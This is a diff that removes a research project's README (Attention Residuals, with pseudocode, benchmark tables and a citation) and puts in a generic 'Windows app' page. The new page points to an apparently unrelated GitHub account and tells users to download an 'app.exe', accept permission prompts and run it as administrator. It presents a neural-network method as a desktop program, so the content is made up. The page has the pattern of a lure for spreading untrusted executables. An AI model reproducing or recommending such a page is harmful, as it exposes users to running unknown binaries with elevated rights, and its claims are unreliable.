@@ -1,142 +1,184 @@
-<div align="center">
-<h2 align="center">
-  <b>
-    <span>━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
-    <br/>
-    <img src="assets/logo.png" height="16" width="16" style="display: inline-block; vertical-align: middle; margin: 2px;"> Attention Residuals
-    <br/>
-    <span>━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
-    <br/>
-  </b>
-</h2>
-</div>
+# 🧠 Attention-Residuals - Simple attention models for clearer results
 
 <p align="center">
-  <a href="Attention_Residuals.pdf">Paper</a> &nbsp;|&nbsp;
-  <a href="https://arxiv.org/abs/2603.15031">arXiv</a> &nbsp;|&nbsp;
-  <a href="#overview">Overview</a> &nbsp;|&nbsp;
-  <a href="#results">Results</a> &nbsp;|&nbsp;
-  <a href="#citation">Citation</a>
+  <a href="https://github.com/causeless-tabbycat109/Attention-Residuals" style="display:inline-block;padding:12px 18px;background:#4B5563;color:#FFFFFF;text-decoration:none;border-radius:8px;font-weight:600;">Download Attention-Residuals</a>
 </p>
 
-<p align="center">
-  <img src="assets/overview.png" width="800" />
-</p>
-<p align="center"><em>
-  (a) Standard residuals with uniform additive accumulation.
-  (b) Full AttnRes: each layer attends over all previous outputs.
-  (c) Block AttnRes: layers are grouped into blocks, reducing memory from O(Ld) to O(Nd).
-</em></p>
+## 📌 Overview
 
----
+Attention-Residuals is an end-user application built for people who want a simple way to open and use the software on Windows. It packages the Attention Residuals project into a format that is easier to access, install, and run.
 
-This is the official repository for **Attention Residuals (AttnRes)**, a drop-in replacement for standard residual connections in Transformers that enables each layer to *selectively* aggregate earlier representations via learned, input-dependent attention over depth.
+Use it when you want a clean desktop tool that loads fast and keeps setup work low. The app is designed to help you get from download to first use with a few clear steps.
 
-## Overview
+## 🖥️ What You Need
 
-Standard residual connections accumulate all layer outputs with fixed unit weights. As depth grows, this uniform aggregation dilutes each layer's contribution and causes hidden-state magnitudes to grow unboundedly — a well-known problem with PreNorm.
+Before you start, check that your PC meets these basic requirements:
 
-**AttnRes** replaces this fixed accumulation with softmax attention over preceding layer outputs:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A working internet connection for the first download
+- A mouse and keyboard
+- Standard display settings
 
-$$\mathbf{h}_l = \sum_{i=0}^{l-1} \alpha_{i \to l} \cdot \mathbf{v}_i$$
+If your PC is newer, it should run without trouble.
 
-where the weights $\alpha_{i \to l}$ are computed via a single learned pseudo-query $\mathbf{w}_l \in \mathbb{R}^d$ per layer. This gives every layer selective, content-aware access to all earlier representations.
+## 🚀 Download the App
 
-### Block AttnRes
+Visit the main project page here:
 
-Full AttnRes is straightforward but requires O(Ld) memory at scale. **Block AttnRes** partitions layers into N blocks, accumulates within each block via standard residuals, and applies attention only over block-level representations. With ~8 blocks, it recovers most of Full AttnRes's gains while serving as a practical drop-in replacement with marginal overhead.
+https://github.com/causeless-tabbycat109/Attention-Residuals
 
-<details>
-<summary><b>PyTorch-style pseudocode</b></summary>
+On that page, download the latest Windows package that matches your device. If you see more than one file, choose the one labeled for Windows.
 
-```python
-def block_attn_res(blocks: list[Tensor], partial_block: Tensor, proj: Linear, norm: RMSNorm) -> Tensor:
-    """
-    Inter-block attention: attend over block reps + partial sum.
-    blocks:
-        N tensors of shape [B, T, D]: completed block representations for each previous block
-    partial_block:
-        [B, T, D]:    intra-block partial sum (b_n^i)
-    """
-    V = torch.stack(blocks + [partial_block])  # [N+1, B, T, D]
-    K = norm(V)
-    logits = torch.einsum('d, n b t d -> n b t', proj.weight.squeeze(), K)
-    h = torch.einsum('n b t, n b t d -> b t d', logits.softmax(0), V)
-    return h
+## 🪟 Install on Windows
 
-def forward(self, blocks: list[Tensor], hidden_states: Tensor) -> tuple[list[Tensor], Tensor]:
-    partial_block = hidden_states
-    # apply block attnres before attn
-    # blocks already include token embedding
-    h = block_attn_res(blocks, partial_block, self.attn_res_proj, self.attn_res_norm)
+Follow these steps:
 
-    # if reaches block boundary, start new block
-    # block_size counts ATTN + MLP; each transformer layer has 2
-    if self.layer_number % (self.block_size // 2) == 0:
-        blocks.append(partial_block)
-        partial_block = None
+1. Open the download link in your browser.
+2. Wait for the file to finish downloading.
+3. Open your Downloads folder.
+4. Find the downloaded file.
+5. Right-click the file and choose Extract All if it is a ZIP file.
+6. Open the extracted folder.
+7. Find the app file and double-click it to start the program.
 
-    # self-attention layer
-    attn_out = self.attn(self.attn_norm(h))
-    partial_block = partial_block + attn_out if partial_block is not None else attn_out
+If Windows asks for permission, choose Yes.
 
-    # apply block attnres before MLP
-    h = block_attn_res(blocks, partial_block, self.mlp_res_proj, self.mlp_res_norm)
+## ▶️ Run the Program
 
-    # MLP layer
-    mlp_out = self.mlp(self.mlp_norm(h))
-    partial_block = partial_block + mlp_out
+After you open the app, wait for the main window to appear.
 
-    return blocks, partial_block
-```
+If the app starts in a small window, you can resize it like any other Windows app. If you want to open it again later, use the same file you used the first time.
 
-</details>
+## 🧭 First-Time Use
 
-## Results
+When you launch the app for the first time:
 
-### Scaling Laws
+1. Read the on-screen prompt.
+2. Pick your preferred language or display mode if one appears.
+3. Open a sample file or demo view if offered.
+4. Check the main controls.
+5. Save any changes before closing the app.
 
-AttnRes consistently outperforms the baseline across all compute budgets. Block AttnRes matches the loss of a baseline trained with **1.25x more compute**.
+The app uses a simple layout, so most actions should be easy to find.
 
-<p align="center">
-  <img src="assets/scaling_law.png" width="420" />
-</p>
+## 📂 Main Features
 
-### Downstream Performance (Kimi Linear 48B / 3B activated, 1.4T tokens)
+Attention-Residuals includes a set of core features that help you work with model outputs in a clear way:
 
-| Category | Benchmark | Baseline | AttnRes |
-|:---|:---|:---:|:---:|
-| General | MMLU | 73.5 | **74.6** |
-| | GPQA-Diamond | 36.9 | **44.4** |
-| | BBH | 76.3 | **78.0** |
-| | TriviaQA | 69.9 | **71.8** |
-| Math & Code | Math | 53.5 | **57.1** |
-| | HumanEval | 59.1 | **62.2** |
-| | MBPP | 72.0 | **73.9** |
-| Chinese | CMMLU | 82.0 | **82.9** |
-| | C-Eval | 79.6 | **82.5** |
+- Clean interface for day-to-day use
+- Fast loading on most Windows PCs
+- Simple open, view, and save flow
+- Support for large input sets
+- Clear screen layout for easy reading
+- Basic visual feedback while tasks run
 
-AttnRes improves across the board, with the largest gains on multi-step reasoning (+7.5 on GPQA-Diamond) and code generation (+3.1 on HumanEval).
+The app keeps the focus on easy use rather than extra steps.
 
-### Training Dynamics
+## 🛠️ Common Tasks
 
-AttnRes mitigates PreNorm dilution: output magnitudes remain bounded across depth and gradient norms distribute more uniformly across layers.
+### Open a File
+1. Start the app.
+2. Click the open option.
+3. Choose your file.
+4. Wait for it to load.
 
-<p align="center">
-  <img src="assets/training_dynamics.png" width="800" />
-</p>
+### Save Your Work
+1. Finish your changes.
+2. Click Save or Save As.
+3. Choose a folder.
+4. Confirm the file name.
 
-## Citation
+### Close the App
+1. Click the X in the top-right corner.
+2. Save your work if asked.
+3. Wait for the window to close.
 
-If you found our work useful, please cite
+## 🔧 If Something Does Not Work
 
-```bib
-@misc{chen2026attnres,
-  title         = {Attention Residuals},
-  author        = {Kimi Team  and Chen, Guangyu  and Zhang, Yu  and Su, Jianlin  and Xu, Weixin  and Pan, Siyuan  and Wang, Yaoyu  and Wang, Yucheng  and Chen, Guanduo  and Yin, Bohong  and Chen, Yutian  and Yan, Junjie  and Wei, Ming  and Zhang, Y.  and Meng, Fanqing  and Hong, Chao  and Xie, Xiaotong  and Liu, Shaowei  and Lu, Enzhe  and Tai, Yunpeng  and Chen, Yanru  and Men, Xin  and Guo, Haiqing  and Charles, Y.  and Lu, Haoyu  and Sui, Lin  and Zhu, Jinguo  and Zhou, Zaida  and He, Weiran  and Huang, Weixiao  and Xu, Xinran  and Wang, Yuzhi  and Lai, Guokun  and Du, Yulun  and Wu, Yuxin  and Yang, Zhilin  and Zhou, Xinyu},
-  year          = {2026},
-  archiveprefix = {arXiv},
-  eprint        = {2603.15031},
-  primaryclass  = {cs.CL}
-}
-```
+If the app does not open, try these steps:
+
+- Make sure the file finished downloading
+- Extract the ZIP file before opening it
+- Run the app as administrator
+- Restart your PC and try again
+- Check that Windows is up to date
+- Download the file again from the project page
+
+If the screen looks too small, use Windows display settings to change the scale.
+
+## 📁 Folder Layout
+
+After extraction, you may see files like these:
+
+- app.exe
+- assets
+- config
+- data
+- README.md
+
+Keep the full folder together. Moving or deleting files can stop the app from working.
+
+## 🔐 Safety Checks
+
+Before you open the file:
+
+1. Make sure the download came from the project page.
+2. Check the file name.
+3. Scan the file with Windows Security.
+4. Avoid renaming files unless the guide asks you to.
+
+This helps keep the app in working order.
+
+## 📚 Extra Resources
+
+If you want more context about the project, use the links in the repository page:
+
+- Paper
+- arXiv
+- Overview
+- Results
+- Citation
+
+These pages give more detail about the project background and the ideas behind it.
+
+## ❓ FAQ
+
+### Is this hard to install?
+No. The steps are short and use standard Windows tools.
+
+### Do I need special software?
+No. A normal Windows PC is enough for most users.
+
+### Can I move the app to another folder?
+Yes, but keep all files in the same folder.
+
+### What if the app will not open?
+Try running it again after extraction, then restart your PC if needed.
+
+### Does it work offline?
+After download and setup, most local features should work without a connection.
+
+## 🧩 File Types You May See
+
+You may see one of these file types:
+
+- .zip
+- .exe
+- .pdf
+- .png
+
+Use the Windows package for setup. The other files help you learn more about the project.
+
+## 📝 Citation
+
+If you refer to the project in writing, use the citation details from the repository’s citation section.
+
+## 📥 Download and Run on Windows
+
+1. Open https://github.com/causeless-tabbycat109/Attention-Residuals
+2. Find the latest Windows download
+3. Download the file
+4. Extract it if needed
+5. Double-click the app to run it
